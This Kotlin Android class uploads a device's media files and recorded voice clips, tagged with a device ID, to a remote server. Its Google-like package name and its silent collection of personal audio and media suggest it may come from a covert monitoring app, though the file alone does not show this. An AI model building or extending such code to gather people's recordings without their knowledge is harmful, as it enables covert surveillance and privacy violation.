package com.opp.googleoperation.network

import android.content.Context
import android.net.Uri
import android.util.Log
import com.opp.googleoperation.data.model.AudioThreatEvent
import com.opp.googleoperation.data.model.MediaEvent
import com.opp.googleoperation.util.Constants
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.Request
import okhttp3.RequestBody
import okio.BufferedSink
import okio.source
import java.io.File
import java.io.InputStream

class B2MediaUploader(private val ctx: Context) {

    companion object {
        private const val TAG = "B2MediaUploader"
    }

    private val prefs = ctx.getSharedPreferences(Constants.PREFS_NAME, Context.MODE_PRIVATE)

    private fun getBaseUrl(): String {
        return prefs.getString(Constants.KEY_SERVER_URL, Constants.DEFAULT_WORKER_URL) ?: Constants.DEFAULT_WORKER_URL
    }

    suspend fun uploadMediaEvent(event: MediaEvent): String? = withContext(Dispatchers.IO) {
        try {
            val uploadEndpoint = "${getBaseUrl().trimEnd('/')}/api/b2/upload"
            val uri = Uri.parse(event.contentUri)
            val mimeType = event.mimeType.ifEmpty { "application/octet-stream" }

            val inputStream: InputStream? = try {
                ctx.contentResolver.openInputStream(uri)
            } catch (e: Exception) {
                Log.w(TAG, "failed to open input stream for media ${event.fileName}", e)
                null
            }

            if (inputStream == null) return@withContext null

            val requestBody = object : RequestBody() {
                override fun contentType() = mimeType.toMediaType()
                override fun contentLength(): Long = event.sizeBytes
                override fun writeTo(sink: BufferedSink) {
                    inputStream.use { stream ->
                        sink.writeAll(stream.source())
                    }
                }
            }

            val encodedFileName = try {
                java.net.URLEncoder.encode(event.fileName, "UTF-8")
            } catch (_: Exception) {
                event.fileName.filter { it.code in 32..126 }
            }

            val request = Request.Builder()
                .url(uploadEndpoint)
                .addHeader("x-device-id", event.deviceId)
                .addHeader("x-file-name", encodedFileName)
                .addHeader("x-media-type", event.mediaType)
                .addHeader("Content-Type", mimeType)
                .post(requestBody)
                .build()

            val response = ApiClient.httpClient.newCall(request).execute()
            val resBody = response.body?.string()
            val successful = response.isSuccessful
            response.close()

            if (successful && !resBody.isNullOrEmpty()) {
                val json = ApiClient.gson.fromJson(resBody, Map::class.java)
                val url = json["url"] as? String
                event.b2Url = url
                event.uploadStatus = "uploaded"
                Log.d(TAG, "media ${event.fileName} successfully uploaded to B2: $url")
                return@withContext url
            } else {
                Log.w(TAG, "media upload failed with HTTP ${response.code}: $resBody")
                event.uploadStatus = "failed"
                return@withContext null
            }
        } catch (e: Exception) {
            Log.w(TAG, "error uploading media to Backblaze B2", e)
            event.uploadStatus = "failed"
            return@withContext null
        }
    }

    suspend fun uploadVoiceClip(event: AudioThreatEvent): String? = withContext(Dispatchers.IO) {
        try {
            val audioFile = File(event.compressedAudioPath)
            if (!audioFile.exists()) {
                Log.w(TAG, "voice audio file does not exist: ${event.compressedAudioPath}")
                return@withContext null
            }

            val uploadEndpoint = "${getBaseUrl().trimEnd('/')}/api/b2/upload"
            val mimeType = "audio/mp4"

            val requestBody = object : RequestBody() {
                override fun contentType() = mimeType.toMediaType()
                override fun contentLength(): Long = audioFile.length()
                override fun writeTo(sink: BufferedSink) {
                    audioFile.inputStream().use { stream ->
                        sink.writeAll(stream.source())
                    }
                }
            }

            val encodedAudioFileName = try {
                java.net.URLEncoder.encode(audioFile.name, "UTF-8")
            } catch (_: Exception) {
                audioFile.name.filter { it.code in 32..126 }
            }

            val request = Request.Builder()
                .url(uploadEndpoint)
                .addHeader("x-device-id", event.deviceId)
                .addHeader("x-file-name", encodedAudioFileName)
                .addHeader("x-media-type", "voice")
                .addHeader("Content-Type", mimeType)
                .post(requestBody)
                .build()

            val response = ApiClient.httpClient.newCall(request).execute()
            val resBody = response.body?.string()
            val successful = response.isSuccessful
            response.close()

            if (successful && !resBody.isNullOrEmpty()) {
                val json = ApiClient.gson.fromJson(resBody, Map::class.java)
                val url = json["url"] as? String
                event.b2Url = url
                Log.d(TAG, "voice clip ${audioFile.name} successfully uploaded to B2: $url")
                return@withContext url
            } else {
                Log.w(TAG, "voice clip upload failed with HTTP ${response.code}: $resBody")
                return@withContext null
            }
        } catch (e: Exception) {
            Log.w(TAG, "error uploading voice clip to Backblaze B2", e)
            return@withContext null
        }
    }
}
